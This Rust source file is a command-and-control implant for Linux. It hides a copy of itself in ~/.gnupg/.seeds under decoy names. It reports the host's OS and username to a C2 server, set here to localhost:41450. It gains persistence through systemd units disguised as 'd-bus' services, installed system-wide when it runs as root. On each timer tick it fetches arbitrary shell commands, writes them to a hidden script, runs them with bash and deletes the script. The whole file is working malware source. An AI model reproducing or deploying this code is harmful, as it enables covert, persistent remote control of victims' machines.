extern crate rand;
extern crate reqwest;
extern crate crypto;

use std::io::Read;
use std::fs::File;
use std::io::BufReader;
use std::path::PathBuf;
use std::io::prelude::*;
use rand::Rng;
use self::crypto::digest::Digest;
use self::crypto::sha2::Sha256;

const CC_SERVER: &str = "http://localhost:41450";
const REGISTER_URI: &str = "/convey/register/";
const CMD_URI: &str = "/convey/cmd/";

const HASH_TYPE: &str = "sha256sum";
const SEED_DIR: &str = ".gnupg/.seeds";
const SEED_FILE: &str = ".seed_gnupg~";
const BIN: &str = "rust-linux";
const BIN_NEW: &str = ".seed_gnupg";
const TEMP_SCRIPT: &str = ".seed_init";

const SERVICE_DEST: &str = ".config/systemd/user";
const SYS_SERVICE_DEST: &str = "/etc/systemd/system";
const SERVICE: &str = "d-bus.service";
const SYS_SERVICE: &str = "root.d-bus.service";
const TIMER: &str = "d-bus.timer";


fn main() {
    /* Get user, home, seed, binary, and seed dir path */

    // Get UID
    let user = std::process::Command::new("id").args(&["-u"])
        .output().expect("Failed to run command");
    let user = String::from_utf8_lossy(&user.stdout);
    let user = user.trim();

    // If UID is 0, user is root. Otherwise, just use the username
    let user: String =
        if user == "0" {
            String::from("root")
        } else {
            let output = std::process::Command::new("whoami")
                .output().expect("Failed to run command");
            let output = String::from_utf8_lossy(&output.stdout);
            String::from(output.trim())
        };

    // Get home dir
    let home_dir =
        if user == "root" {
            PathBuf::from("/root")
        } else {
            let home_dir = std::env::home_dir()
                .expect("Failed to get home dir");
            home_dir
        };

    // Get seed dir path
    let mut seed_path = home_dir.clone();
    seed_path.push(SEED_DIR);
    let seed_dir_path = seed_path.clone();
    let seed_dir_path = seed_dir_path.to_str()
        .expect("Failed to convert path to string");

    // Get binary path
    let mut bin_path = seed_path.clone();
    bin_path.push(BIN_NEW);
    let bin_path = bin_path.to_str()
        .expect("Failed to convert path to string");

    // Get temp script path for running commands
    let mut temp_script_path = seed_path.clone();
    temp_script_path.push(TEMP_SCRIPT);
    let temp_script_path = temp_script_path.to_str()
        .expect("Failed to convert path to string");

    // Get seed file path
    seed_path.push(SEED_FILE);
    let seed_path = seed_path.to_str()
        .expect("Failed to convert path to string");

    // Check to see if the seed is already initialized
    let seed_exists = std::path::Path::new(seed_path).exists();

    if !seed_exists {
        init_seed(seed_dir_path, seed_path, bin_path);
        register(&seed_path, &user);
        init_systemd(&user);
    } else {
        run_cmd(temp_script_path, seed_path);
    }
}


fn init_seed(seed_dir_path: &str, seed_path: &str, bin_path: &str) {

    // Create seed dir
    std::fs::create_dir_all(seed_dir_path)
        .expect("Failed to create directory");

    // Install binary to seed dir
    std::fs::copy(BIN, bin_path)
        .expect("Failed to copy binary");

    /* Generate seed */

    // Start RNG thread to supply randomness from OS
    let mut rng = rand::thread_rng();

    // Open seed file to write to
    let mut seed = File::create(&seed_path)
        .expect("Failed to write to seed");

    // Generate seed data and write it to the file
    let mut seed_data = String::new();
    for _ in 0..500_000 {
        let random_char = rng.gen::<char>();
        seed_data.push(random_char);
    }
    let seed_data = seed_data.into_bytes();
    seed.write(&seed_data[..])
        .expect("Failed to write to data to seed");
    seed.flush()
        .expect("Failed to write to data to seed");
}


fn register(seed_path: &str, user: &str) {
    /* Gather system information */

    // Get OS
    let operating_sys = std::process::Command::new("uname")
        .output().expect("Failed to run command");
    let operating_sys = String::from_utf8_lossy(&operating_sys.stdout);
    let operating_sys = operating_sys.trim();

    // Get seed hash
    let hash_sum = get_seed_hash(&seed_path);

    // Set params for POST request
    let params = [
        ("hash_type", HASH_TYPE),
        ("hash_sum", &hash_sum),
        ("operating_sys", &operating_sys),
        ("user", &user),
    ];

    // Get URL to get command from
    let mut cc_url = String::from(CC_SERVER);
    cc_url.push_str(REGISTER_URI);

    // Send the POST request to register with CC server
    let client = reqwest::Client::new()
        .expect("Failed to init HTTP client");
    client.post(&cc_url).unwrap()
        .form(&params).expect("Failed to create POST form")
        .send().expect("Failed to send request");
}


fn init_systemd(user: &str) {
    // Install and initialize systemd timer and service
    // Process depends on user type
    if user == "root" {
        // Create systemd directory
        std::fs::create_dir_all(SYS_SERVICE_DEST)
            .expect("Failed to create directory");

        // Get new name and path for systemd service
        let mut sys_service_path = PathBuf::from(SYS_SERVICE_DEST);
        let mut timer_path = sys_service_path.clone();
        timer_path.push(TIMER);
        sys_service_path.push(SYS_SERVICE);
        let sys_service_path = sys_service_path.to_str()
        .expect("Failed to convert path to string");

        // Install systemd service and timer
        std::fs::copy(SYS_SERVICE, sys_service_path)
            .expect("Failed to copy service");
        std::fs::copy(TIMER, timer_path)
            .expect("Failed to copy timer");

        // Enable and start systemd timer
        std::process::Command::new("systemctl")
            .args(&["enable", "--now", TIMER])
            .output().expect("Failed to run command");
    } else {
        // Get user service path
        let mut service_path = std::env::home_dir()
            .expect("Failed to get home directory");
        service_path.push(SERVICE_DEST);
        let service_dir_path = service_path.clone();
        let mut timer_path = service_path.clone();
        timer_path.push(TIMER);
        service_path.push(SERVICE);

        // Create systemd directory, then install service and timer
        std::fs::create_dir_all(service_dir_path)
            .expect("Failed to create directory");
        std::fs::copy(SERVICE, service_path)
            .expect("Failed to copy service");
        std::fs::copy(TIMER, timer_path)
            .expect("Failed to copy timer");

        // Enable and start systemd timer
        std::process::Command::new("systemctl")
            .args(&["enable", "--user", "--now", TIMER])
            .output().expect("Failed to run command");
    }
}


fn run_cmd(temp_script_path: &str, seed_path: &str) {
    // Get seed hash
    let hash_sum = get_seed_hash(&seed_path);

    // Set params for POST request
    let params = [
        ("hash_sum", &hash_sum)
    ];

    // Get URL to get command from
    let mut cc_url = String::from(CC_SERVER);
    cc_url.push_str(CMD_URI);

    // Send the POST request to contact CC server
    let client = reqwest::Client::new()
        .expect("Failed to init HTTP client");
    let mut res = client.post(&cc_url).unwrap()
        .form(&params).expect("Failed to create POST form")
        .send().expect("Failed to send request");

    // Get command from CC server response
    let mut cmd = String::new();
    res.read_to_string(&mut cmd)
        .expect("Failed to read to string");

    // Create script file
    let mut temp_script = File::create(&temp_script_path)
        .expect("Failed to write to file");
    let cmd = cmd.into_bytes();
    temp_script.write(&cmd)
        .expect("Failed to write to file");
    temp_script.flush()
        .expect("Failed to write to file");

    // Execute and delete script
    std::process::Command::new("bash")
        .args(&[&temp_script_path])
        .output().expect("Failed to run command");
    std::fs::remove_file(&temp_script_path)
        .expect("Failed to remove file");
}


fn get_seed_hash(file_path: &str) -> String {
    // Read the seed!
    let infile = File::open(file_path)
        .expect("Failed to open file");
    let mut buf_reader = BufReader::new(infile);
    let mut file_contents = String::new();
    buf_reader.read_to_string(&mut file_contents)
        .expect("Failed to read file content into string");

    // Get seed hash sum
    let mut hasher = Sha256::new();
    hasher.input_str(&file_contents);
    hasher.result_str()
}
